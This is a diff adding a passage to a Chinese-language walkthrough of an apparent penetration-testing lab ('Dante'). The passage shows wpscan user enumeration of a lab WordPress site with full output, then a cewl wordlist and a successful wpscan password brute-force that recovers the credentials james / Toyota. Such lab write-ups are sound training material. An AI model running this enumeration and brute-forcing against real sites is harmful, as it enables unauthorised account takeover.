@@ -153,3 +153,149 @@ Incoming这个目录下有个文件将它下载下来查看 ，Outgoing这个目
 <figure><img src="../../../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>
 
 除了/wordpress这个目录还有第一个flag，我们访问wordpress这个目录
+
+
+
+wpscan扫描一下
+
+```
+┌──(root㉿kali)-[~/Desktop/test/Dante]
+└─# wpscan --url http://10.10.110.100:65000/wordpress/ --enumerate u
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.24
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://10.10.110.100:65000/wordpress/ [10.10.110.100]
+[+] Started: Thu Jan  4 11:45:49 2024
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] robots.txt found: http://10.10.110.100:65000/wordpress/robots.txt
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.10.110.100:65000/wordpress/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://10.10.110.100:65000/wordpress/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Debug Log found: http://10.10.110.100:65000/wordpress/wp-content/debug.log
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | Reference: https://codex.wordpress.org/Debugging_in_WordPress
+
+[+] Upload directory has listing enabled: http://10.10.110.100:65000/wordpress/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.10.110.100:65000/wordpress/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://10.10.110.100:65000/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>
+ |  - http://10.10.110.100:65000/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>
+
+[+] WordPress theme in use: twentytwenty
+ | Location: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/
+ | Last Updated: 2023-11-07T00:00:00.000Z
+ | Readme: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/readme.txt
+ | [!] The version is out of date, the latest version is 2.4
+ | Style URL: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2
+ | Style Name: Twenty Twenty
+ | Style URI: https://wordpress.org/themes/twentytwenty/
+ | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.2 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:01 <==============================================================================> (10 / 10) 100.00% Time: 00:00:01
+
+[i] User(s) Identified:
+
+[+] admin
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://10.10.110.100:65000/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] james
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Thu Jan  4 11:46:03 2024
+[+] Requests Done: 14
+[+] Cached Requests: 50
+[+] Data Sent: 4.183 KB
+[+] Data Received: 15.508 KB
+[+] Memory used: 172.539 MB
+[+] Elapsed time: 00:00:13
+
+```
+
+
+
+
+
+生成一个密码字典
+
+```
+┌──(root㉿kali)-[~/Desktop/test/Dante]
+└─# cewl -w dantepass.txt -d 5 -m 4 http://10.10.110.100:65000/wordpress/index.php/meet-the-team/
+CeWL 6.0 (Version Sync) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
+```
+
+将保存的用户名尝试暴力破解
+
+```
+┌──(root㉿kali)-[~/Desktop/test/Dante]
+└─# wpscan --url http://10.10.110.100:65000/wordpress/ -U user.txt -P dantepass.txt
+[+] Performing password attack on Wp Login against 6 user/s
+[SUCCESS] - james / Toyota                                                                                                                                  
+Trying admin / Posts Time: 00:07:01 <=====================================================================             > (2619 / 3061) 85.56%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: james, Password: Toyota
+```
+
+成功爆破出james 的密码 Toyota
